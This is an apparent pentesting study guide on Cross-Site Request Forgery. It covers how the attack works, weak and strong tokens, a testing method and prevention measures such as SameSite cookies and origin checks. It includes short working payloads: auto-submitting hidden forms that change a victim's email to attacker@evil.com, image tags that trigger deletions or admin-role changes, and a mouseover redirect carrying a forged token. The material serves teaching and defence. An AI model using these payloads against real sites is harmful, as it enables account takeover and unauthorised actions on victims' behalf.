# Cross-Site Request Forgery (CSRF)

## Overview

Cross-Site Request Forgery (CSRF) is a web security vulnerability where an attacker tricks an authenticated user's browser into sending unwanted requests to a web application.

Unlike XSS, CSRF does **not steal credentials**. Instead, it abuses the trust that a web application places in a user's authenticated browser session.

OWASP Top 10 (2025):
- A01: Broken Access Control (often associated)
- Related to Session Management

---

# How CSRF Works

## Normal Request

```
User
 │
 │ Login
 ▼
Web Application
 │
 │ Session Cookie
 ▼
Browser stores cookie

User clicks "Update Email"

Browser
 │
 │ POST /update_email
 │ Cookie: PHPSESSID=abc123
 ▼
Server updates email
```

---

## CSRF Attack Flow

```
Victim logs in
      │
      ▼
Session Cookie Stored

      │
Victim visits attacker website

      │
      ▼
Attacker page automatically sends request

POST /update_email

Cookie automatically attached

      │
      ▼
Server trusts request

Email Changed
```

---

# Why CSRF Works

Browsers automatically include:

- Session Cookies
- Authentication Cookies

for every request sent to the same domain.

The browser **does not know** whether the request came from:

- Legitimate Website
- Malicious Website

It simply sends cookies.

The server trusts the cookie.

---

# Requirements for CSRF

A successful CSRF attack generally requires:

✅ Victim is authenticated

✅ State-changing functionality exists

Examples:

- Change Password
- Change Email
- Transfer Money
- Delete Account
- Update Profile

✅ No CSRF protection

Examples:

- No CSRF Token
- Weak Token
- No Origin Validation

---

# Common CSRF Targets

- Change Email
- Change Password
- Update Phone Number
- Change Address
- Money Transfer
- Add New Admin
- Delete Account
- Enable/Disable MFA
- API Settings
- Account Preferences

---

# Identifying CSRF

During testing, inspect requests that modify data.

Questions to ask:

- Is there a CSRF token?
- Is the token unique?
- Is the token validated?
- Is the action performed using cookies only?
- Can the request be replayed outside the application?

---

# GET vs POST

Many developers believe:

POST = Safe

This is FALSE.

Both GET and POST are vulnerable if there is no CSRF protection.

Example vulnerable GET:

```
GET /delete?id=10
```

Simply opening:

```
<img src="https://site/delete?id=10">
```

can execute the request.

---

# Basic CSRF Exploitation

Original Request

```
POST /update_email

email=user@gmail.com
```

No token exists.

Attacker creates:

```html
<form action="http://victim/update_email.php" method="POST">

<input type="hidden"
name="email"
value="attacker@evil.com">

</form>

<script>
document.forms[0].submit();
</script>
```

When victim opens page:

Browser automatically sends:

```
POST /update_email

Cookie:
PHPSESSID=abc123

email=attacker@evil.com
```

Server updates email.

---

# Hidden Auto-Submit Form

Example:

```html
<html>

<body>

<form action="http://victim/update_email.php"
method="POST"
id="attack">

<input
type="hidden"
name="email"
value="attacker@evil.com">

</form>

<script>

document.getElementById("attack").submit();

</script>

</body>

</html>
```

Very common in real-world CSRF attacks.

---

# Image-Based CSRF

GET requests can be triggered using:

```html
<img src="http://victim/delete?id=10">
```

or

```html
<img src="http://victim/update?role=admin">
```

Browser automatically loads image.

Server executes request.

---

# JavaScript Event CSRF

Example:

```html
<img

src="banner.png"

onmouseover="window.location='http://victim/update_role.php?role=staff&csrf_token=YWRtaW4='">

```

Victim only moves mouse.

Browser sends request.

Role changes.

---

# Weak CSRF Tokens

A CSRF token should be:

- Random
- Unique
- Session-specific
- Unpredictable

Weak Example:

```
csrf_token=YWRtaW4=
```

Base64 Decode:

```
admin
```

Attacker can generate token easily.

Weak token = No protection.

---

# Strong vs Weak Tokens

Weak

```
csrf=admin
```

```
csrf=12345
```

```
csrf=Base64(role)
```

Strong

```
csrf=
e2d87dcb7aaf832ba2cf...
```

Random

Long

Per Session

Cannot be predicted.

---

# Common Ways to Detect CSRF

## 1. Missing Token

Sensitive request contains no token.

---

## 2. Static Token

```
csrf=12345
```

Same for every user.

---

## 3. Predictable Token

Generated from:

- Username
- Email
- User ID
- Role
- Timestamp

---

## 4. Reusable Token

Works multiple times.

Should expire.

---

## 5. Token Not Bound To Session

Copy token

Use another account

Still works

Vulnerable.

---

## 6. GET Requests

Sensitive functionality uses GET.

```
GET /changeEmail
```

Often exploitable.

---

# Testing Methodology

## Step 1

Find state-changing request.

---

## Step 2

Capture request in Burp Suite.

---

## Step 3

Look for:

- CSRF Token
- Origin Header
- Referer Header

---

## Step 4

Remove token.

Does request still work?

---

## Step 5

Replay request from external HTML page.

If yes

Likely vulnerable.

---

# Prevention

## 1. Synchronizer CSRF Tokens

Generate:

Random Token

↓

Store in Session

↓

Verify on every request

Best Practice.

---

## 2. SameSite Cookies

```
Set-Cookie:

SameSite=Lax
```

or

```
SameSite=Strict
```

Prevents cookies from being sent cross-site.

---

## 3. Verify Origin Header

Accept only:

```
Origin:
https://example.com
```

Reject others.

---

## 4. Verify Referer

Ensure request came from:

```
https://example.com
```

---

## 5. Re-authentication

Require password again for:

- Password Change
- Email Change
- Payment
- MFA Disable

---

## 6. Use POST for Sensitive Actions

Avoid:

```
GET /delete
```

Prefer:

```
POST /delete
```

---

# Real World Examples

Changing:

- Email
- Password
- Shipping Address
- Profile Picture
- Payment Method
- API Key
- MFA
- Admin Settings

All can be vulnerable to CSRF.

---

# Pentesting Checklist

□ Identify authenticated endpoints

□ Look for state-changing requests

□ Capture request

□ Check CSRF token

□ Remove token

□ Modify token

□ Replay request

□ Create malicious HTML page

□ Test GET requests

□ Test predictable tokens

□ Test reusable tokens

□ Verify SameSite cookies

□ Check Origin validation

□ Check Referer validation

---

# Key Takeaways

- CSRF abuses authenticated sessions.
- Browser automatically sends cookies.
- Missing or weak CSRF tokens make exploitation possible.
- GET and POST requests can both be vulnerable.
- Auto-submitting HTML forms and image requests are common attack vectors.
- Strong CSRF protection requires unpredictable session-bound tokens.
- SameSite cookies, Origin/Referer validation, and re-authentication provide additional protection.
